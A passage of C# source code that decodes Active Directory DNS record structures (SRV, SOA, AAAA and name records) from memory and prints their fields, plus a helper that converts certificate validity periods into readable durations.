                    IntPtr pDataPtr = (IntPtr)(pData.ToInt64() + 2);
                    String sRecord = String.Empty;
                    for (int i = 0; i < iSeg; i++)
                    {
                        Int16 iSegLen = Marshal.ReadByte(pDataPtr);
                        sRecord += Marshal.PtrToStringAnsi((IntPtr)(pDataPtr.ToInt64() + 1), iSegLen);
                        if (i != (iSeg - 1))
                        {
                            sRecord += ".";
                        }
                        pDataPtr = (IntPtr)(pDataPtr.ToInt64() + iSegLen + 1);
                    }
                    Console.WriteLine("    |_ DNS_RPC_RECORD_NODE_NAME : " + sRecord);
                }
                else if (oRecord.wType == 33)
                {
                    Int16 iPrio = getInt16ToBigEndian(Marshal.ReadInt16(pData));
                    Int16 iWeight = getInt16ToBigEndian(Marshal.ReadInt16((IntPtr)(pData.ToInt64() + 2)));
                    Int16 iPort = getInt16ToBigEndian(Marshal.ReadInt16((IntPtr)(pData.ToInt64() + 4)));
                    Int16 iSeg = Marshal.ReadByte((IntPtr)(pData.ToInt64() + 7));
                    IntPtr pDataPtr = (IntPtr)(pData.ToInt64() + 8);
                    String sRecord = String.Empty;
                    for (int i = 0; i < iSeg; i++)
                    {
                        Int16 iSegLen = Marshal.ReadByte(pDataPtr);
                        sRecord += Marshal.PtrToStringAnsi((IntPtr)(pDataPtr.ToInt64() + 1), iSegLen);
                        if (i != (iSeg - 1))
                        {
                            sRecord += ".";
                        }
                        pDataPtr = (IntPtr)(pDataPtr.ToInt64() + iSegLen + 1);
                    }
                    Console.WriteLine("    |_ DNS_RPC_RECORD_SRV");
                    Console.WriteLine("       |_ Priority : " + iPrio);
                    Console.WriteLine("       |_ Weight   : " + iWeight);
                    Console.WriteLine("       |_ Port     : " + iPort);
                    Console.WriteLine("       |_ Name     : " + sRecord);
                }
                else if (oRecord.wType == 6)
                {
                    Int32 iSerial = getInt32ToBigEndian(Marshal.ReadInt32(pData));
                    Int32 iRefresh = getInt32ToBigEndian(Marshal.ReadInt32((IntPtr)(pData.ToInt64() + 4)));
                    Int32 iRetry = getInt32ToBigEndian(Marshal.ReadInt32((IntPtr)(pData.ToInt64() + 8)));
                    Int32 iExpire = getInt32ToBigEndian(Marshal.ReadInt32((IntPtr)(pData.ToInt64() + 12)));
                    Int32 iMinimumTtl = getInt32ToBigEndian(Marshal.ReadInt32((IntPtr)(pData.ToInt64() + 16)));

                    Int16 iLen = Marshal.ReadByte((IntPtr)(pData.ToInt64() + 20));
                    Int16 iSeg = Marshal.ReadByte((IntPtr)(pData.ToInt64() + 21));
                    IntPtr pDataPtr = (IntPtr)(pData.ToInt64() + 22);
                    String sNamePrimaryServer = String.Empty;
                    for (int i = 0; i < iSeg; i++)
                    {
                        Int16 iSegLen = Marshal.ReadByte(pDataPtr);
                        sNamePrimaryServer += Marshal.PtrToStringAnsi((IntPtr)(pDataPtr.ToInt64() + 1), iSegLen);
                        if (i != (iSeg - 1))
                        {
                            sNamePrimaryServer += ".";
                        }
                        pDataPtr = (IntPtr)(pDataPtr.ToInt64() + iSegLen + 1);
                    }

                    iSeg = Marshal.ReadByte((IntPtr)(pData.ToInt64() + 21 + iLen));
                    pDataPtr = (IntPtr)(pData.ToInt64() + 22 + iLen);
                    String sZoneAdminEmail = String.Empty;
                    for (int i = 0; i < iSeg; i++)
                    {
                        Int16 iSegLen = Marshal.ReadByte(pDataPtr);
                        sZoneAdminEmail += Marshal.PtrToStringAnsi((IntPtr)(pDataPtr.ToInt64() + 1), iSegLen);
                        if (i != (iSeg - 1))
                        {
                            sZoneAdminEmail += ".";
                        }
                        pDataPtr = (IntPtr)(pDataPtr.ToInt64() + iSegLen + 1);
                    }

                    Console.WriteLine("    |_ DNS_RPC_RECORD_SOA");
                    Console.WriteLine("       |_ SerialNo      : " + iSerial);
                    Console.WriteLine("       |_ Refresh       : " + iRefresh);
                    Console.WriteLine("       |_ Retry         : " + iRetry);
                    Console.WriteLine("       |_ Expire        : " + iExpire);
                    Console.WriteLine("       |_ MinimumTtl    : " + iMinimumTtl);
                    Console.WriteLine("       |_ PrimaryServer : " + sNamePrimaryServer);
                    Console.WriteLine("       |_ AdminEmail    : " + sZoneAdminEmail);
                }
                else if (oRecord.wType == 28)
                {
                    Byte[] bIPV6 = new byte[16];
                    Marshal.Copy(pData, bIPV6, 0, 16);
                    Console.WriteLine("    |_ DNS_RPC_RECORD_AAAA : " + new IPAddress(bIPV6).ToString());
                }
                else
                {
                    Console.WriteLine("    |_ Unimplemented DNS Record Type ---> " + oRecord.wType);
                    Console.WriteLine("       |_ DEBUG : " + BitConverter.ToString(arrObj).Replace("-", " "));
                }

                Marshal.FreeHGlobal(pObject);
            } catch (Exception ex)
            {
                Console.WriteLine("    |_ Failed to parse DNS entry..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("       |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("       |_ " + ex.Message);
                }
            }
        }

        public static string ConvertPKIPeriod(byte[] bytes)
        {
            try
            {
                Array.Reverse(bytes);
                var temp = BitConverter.ToString(bytes).Replace("-", "");
                var value = Convert.ToInt64(temp, 16) * -.0000001;

                if ((value % 31536000 == 0) && (value / 31536000) >= 1)
                {
                    if ((value / 31536000) == 1)
                    {
                        return "1 year";
                    }

                    return $"{value / 31536000} years";
                }
                else if ((value % 2592000 == 0) && (value / 2592000) >= 1)
                {
                    if ((value / 2592000) == 1)
                    {
                        return "1 month";
                    }
                    else
                    {
                        return $"{value / 2592000} months";
                    }
                }
                else if ((value % 604800 == 0) && (value / 604800) >= 1)
                {
                    if ((value / 604800) == 1)
                    {
                        return "1 week";
                    }
                    else
                    {
                        return $"{value / 604800} weeks";
                    }
                }
                else if ((value % 86400 == 0) && (value / 86400) >= 1)
                {
                    if ((value / 86400) == 1)
                    {
                        return "1 day";
                    }
                    else
                    {
                        return $"{value / 86400} days";
                    }
                }
                else if ((value % 3600 == 0) && (value / 3600) >= 1)
                {
                    if ((value / 3600) == 1)
                    {
                        return "1 hour";
                    }
                    else
                    {
                        return $"{value / 3600} hours";
                    }
                }
                else
                {
                    return "";
                }
            }
            catch (Exception)
            {
                return "ERROR";
            }
        }
    }
}
